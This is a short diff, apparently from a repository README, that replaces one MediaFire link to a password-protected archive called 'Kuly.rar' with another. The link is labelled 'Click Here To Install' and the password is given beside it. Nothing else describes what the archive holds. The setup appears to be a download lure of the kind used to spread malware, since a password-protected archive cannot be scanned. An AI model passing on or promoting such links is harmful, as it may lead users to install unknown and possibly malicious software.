@@ -1,2 +1,2 @@
-[Click Here To Install](https://www.mediafire.com/file/seldzbd38v6r25i/Kuly.rar/file )
+[Click Here To Install](https://www.mediafire.com/file/qj62789zh1upc10/Kuly.rar/file )
 [Pass - 8469]
